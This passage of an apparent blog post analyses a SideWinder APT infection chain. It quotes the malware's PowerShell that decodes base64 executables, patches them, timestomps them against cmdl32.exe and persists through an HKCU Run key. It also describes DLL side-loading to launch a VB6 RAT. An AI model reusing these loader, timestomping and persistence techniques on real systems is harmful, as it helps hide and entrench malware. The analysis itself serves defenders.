ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and the executable is modified for the last time and copied in $binDir:</p><blockquote class="qk ql qm"><p id="442c" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];<br/> [array]::copy($rn,0,$bytes,$bytes.length — 2,2);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;</p></blockquote><p id="7639" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The dll is decoded, modified and written on disk in the same way:</p><blockquote class="qk ql qm"><p id="da3f" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);<br/> [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;<br/> updt -t $binPathdll -b $cmdl32path</p></blockquote><p id="bcfb" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The Trick very important here is : <strong class="os id">[array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); t</strong>o modify the dll.</p><p id="8d37" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">If you decode the before the modification you have a dll truncated.</p><p id="5f20" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">before:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu qo"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="371" loading="lazy" role="presentation"/></picture></div></div></figure><p id="c640" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">after:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu qp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*gskxEMV2wHIwHkcKEQu-NQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*gskxEMV2wHIwHkcKEQu-NQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*gskxEMV2wHIwHkcKEQu-NQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*gskxEMV2wHIwHkcKEQu-NQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*gskxEMV2wHIwHkcKEQu-NQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*gskxEMV2wHIwHkcKEQu-NQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*gskxEMV2wHIwHkcKEQu-NQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="390" loading="lazy" role="presentation"/></picture></div></div></figure><p id="48ef" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">In fact:</p><p id="a0e4" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The powershell modify the dll to add $lines</p><p id="32ff" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and $lines</p><blockquote class="qk ql qm"><p id="45f6" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$line = new-object byte[] 64;<br/>$buf6 =[Byte[]] (,0x23 * 64);<br/>$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);<br/>[array]::copy($cbytes,$line,$cbytes.length);</p></blockquote><p id="8e83" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and $cmdLine</p><blockquote class="qk ql qm"><p id="642b" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$bin =Winset.exe</p><p id="175a" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);<br/>$cmdLine = $bin+ “ “ +$cmdLine;<br/>}</p></blockquote><p id="28ce" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">like in the dll: .string “Winset.exe -0000000100001223</p><p id="924e" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">So we have in the same folder: Winset\Config</p><ul class=""><li id="ccf4" class="oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn qq qr qs bk">Winset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool</li><li id="170f" class="oq or ic os b ot qt ov ow ox qu oz pa pb qv pd pe pf qw ph pi pj qx pl pm pn qq qr qs bk">cmpbk32.dll (part2 modified and decoded)</li><li id="9727" class="oq or ic os b ot qt ov ow ox qu oz pa pb qv pd pe pf qw ph pi pj qx pl pm pn qq qr qs bk">57146C96.dll (vb virtual machine)</li><li id="423f" class="oq or ic os b ot qt ov ow ox qu oz pa pb qv pd pe pf qw ph pi pj qx pl pm pn qq qr qs bk">cmdl32.exe (executable of windows)</li></ul><p id="e1ff" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The powershell change timestamps of files copied:</p><blockquote class="qk ql qm"><p id="a795" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">updt -t $binPathdll -b $cmdl32path</p><p id="84da" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">updt -t $binPath -b $cmdl32path</p><p id="1537" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">function updt($t, $b){<br/> (ls $t).LastWriteTime = (ls $b).LastWriteTime<br/> (ls $t).CreationTime = (ls $b).CreationTime<br/> (ls $t).LastAccessTime = (ls $b).LastAccessTime<br/>}</p></blockquote><h1 id="4f4a" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk">Persistance</h1><p id="2a4d" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">The persistant is a hkey run very basic with the path of the dll in parameter:</p><p id="2963" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$run = ‘HKCU:Software\Microsoft\Windows\CurrentVersion\Run\’;</p><p id="9dd6" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;</p><p id="09a4" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">To reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.</p><h1 id="d509" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk">Loading Chain</h1><p id="ce69" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">The powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.</p><p id="8812" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">this exe used: cmpbk32.dll</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div class="pt pu qy"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 1100w, https://miro.medium.com/v2/resize:fit:1268/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 1268w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 634px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*NyF5UD6MIWldtbpEr3y5IQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NyF5UD6MIWldtbpEr3y5IQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NyF5UD6MIWldtbpEr3y5IQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NyF5UD6MIWldtbpEr3y5IQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NyF5UD6MIWldtbpEr3y5IQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NyF5UD6MIWldtbpEr3y5IQ.png 1100w, https://miro.medium.com/v2/resize:fit:1268/1*NyF5UD6MIWldtbpEr3y5IQ.png 1268w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 634px"/><img alt="" class="bh mr qg c" width="634" height="162" loading="lazy" role="presentation"/></picture></div></figure><p id="f4e3" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">So when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)</p><p id="18a6" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">the entrypoint is exectuted.</p></div></div><div class="qb"><div class="ab dn"><div class="mm qz mn ra mo rb dr rc ds rd du bh"><figure class="pw px py pz qa qb rf rg paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu re"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*fQ8cDP8CRj8EmmzfKMnXRw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fQ8cDP8CRj8EmmzfKMnXRw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fQ8cDP8CRj8EmmzfKMnXRw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fQ8cDP8CRj8EmmzfKMnXRw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fQ8cDP8CRj8EmmzfKMnXRw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fQ8cDP8CRj8EmmzfKMnXRw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*fQ8cDP8CRj8EmmzfKMnXRw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh mr qg c" width="1000" height="769" loading="eager" role="presentation"/></picture></div></div></figure></div></div></div><div class="ab dn"><div class="du bh hh hi hj hk"><p id="cce4" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The important part is:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu rh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*eSBQqIXyF-U2Qq51FYXsMg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*eSBQqIXyF-U2Qq51FYXsMg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*eSBQqIXyF-U2Qq51FYXsMg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*eSBQqIXyF-U2Qq51FYXsMg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*eSBQqIXyF-U2Qq51FYXsMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*eSBQqIXyF-U2Qq51FYXsMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*eSBQqIXyF-U2Qq51FYXsMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="168" loading="eager" role="presentation"/></picture></div></div></figure><p id="1fc1" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2</p></div></div></div><div class="ab dn ri rj rk rl" role="separator"><span class="rm by bm rn ro rp"></span><span class="rm by bm rn ro rp"></span><span class="rm by bm rn ro"></span></div><div class="hv hw hx hy hz"><div class="ab dn"><div class="du bh hh hi hj hk"><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu rq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*cyKfNUGcZs3qFmxqlZYEww.png 640w, https://miro.medium.com/v2/resize:fit:720/1*cyKfNUGcZs3qFmxqlZYEww.png 720w, https://miro.medium.com/v2/resize:fit:750/1*cyKfNUGcZs3qFmxqlZYEww.png 750w, https://miro.medium.com/v2/resize:fit:786/1*cyKfNUGcZs3qFmxqlZYEww.png 786w, https://miro.medium.com/v2/resize:fit:828/1*cyKfNUGcZs3qFmxqlZYEww.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*cyKfNUGcZs3qFmxqlZYEww.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*cyKfNUGcZs3qFmxqlZYEww.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="364" loading="eager" role="presentation"/></picture></div></div></figure><p id="5f0d" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Winset.exe is RAT developed in VB6.</p><p id="0754" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">You can find an complete analysis here: <a class="ag jw" href="https://s.tencent.com/research/report/479.html" rel="noopener ugc nofollow" target="_blank">https://s.tencent.com/research/report/479.html</a></p><h1 id="9fab" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk">Threat Intelligence</h1><p id="0e1b" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">We have the TTPs described in Tencent with the same phases.</p><p id="5363" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Sidewinder is a Indian Group targeting Pakistan military infrastructure.</p><p id="0430" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The content of the RTF is cleary oriented to Navy Pakistani.</p><p id="fdad" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">If we check the infrastructure of the attackers:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu rr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*UNB3nsU-2fey_uCyR0BC4w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UNB3nsU-2fey_uCyR0BC4w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UNB3nsU-2fey_uCyR0BC4w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UNB3nsU-2fey_uCyR0BC4w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UNB3nsU-2fey_uCyR0BC4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UNB3nsU-2fey_uCyR0BC4w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*UNB3nsU-2fey_uCyR0BC4w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img 